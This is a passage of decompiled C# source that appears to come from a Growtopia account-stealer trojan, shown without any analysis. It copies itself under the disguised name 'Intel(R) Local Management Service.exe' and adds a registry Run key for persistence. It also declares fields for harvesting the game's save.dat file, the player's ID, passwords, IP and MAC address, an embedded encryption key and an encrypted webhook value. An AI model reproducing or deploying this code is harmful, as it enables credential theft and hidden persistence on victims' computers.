				Directory.CreateDirectory(text);
			}
			try
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, text + "\\Intel(R) Local Management Service.exe", true);
			}
			catch
			{
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey.SetValue("Intel Management", text + "\\Intel(R) Local Management Service.exe");
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000044C0 File Offset: 0x000026C0
		public static string[] thonk()
		{
			string[] result = new string[10];
			foreach (string name in Registry.CurrentUser.GetSubKeyNames())
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
				string text = registryKey.ToString();
				string text2 = text.Replace("HKEY_CURRENT_USER\\", "");
				bool flag = Program.IsDigitsOnly(text2);
				if (flag)
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text2);
					string text3 = registryKey2.ToString();
					string str = text3.Replace("HKEY_CURRENT_USER\\", "");
					return Program.GetRegistry(str);
				}
			}
			return result;
		}

		// Token: 0x04000005 RID: 5
		public static string cipher = "";

		// Token: 0x04000006 RID: 6
		public static bool credo = true;

		// Token: 0x04000007 RID: 7
		public static bool desktop = true;

		// Token: 0x04000008 RID: 8
		public static string dirPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\";

		// Token: 0x04000009 RID: 9
		public static string encryption = "SecretKey944309753";

		// Token: 0x0400000A RID: 10
		public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();

		// Token: 0x0400000B RID: 11
		public static string growid = "";

		// Token: 0x0400000C RID: 12
		public static string hook = "0mRoduC0xjd8O9PkKuIC7w==";

		// Token: 0x0400000D RID: 13
		public static string lastworld = "";

		// Token: 0x0400000E RID: 14
		public static string localip = "";

		// Token: 0x0400000F RID: 15
		public static string mac = "";

		// Token: 0x04000010 RID: 16
		public static string passwords = "";

		// Token: 0x04000011 RID: 17
		public static bool pong = true;

		// Token: 0x04000012 RID: 18
		public static bool isgt = true;

		// Token: 0x04000013 RID: 19
		public static string savePath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";

		// Token: 0x04000014 RID: 20
		public static bool start = true;

		// Token: 0x04000015 RID: 21
		private static string retarded = Path.GetTempPath() + "/mat-debug-6974741/Update.exe";

		// Token: 0x04000016 RID: 22
		public static string retards = Path.GetTempPath() + "mat-debug-6974741";
	}
}
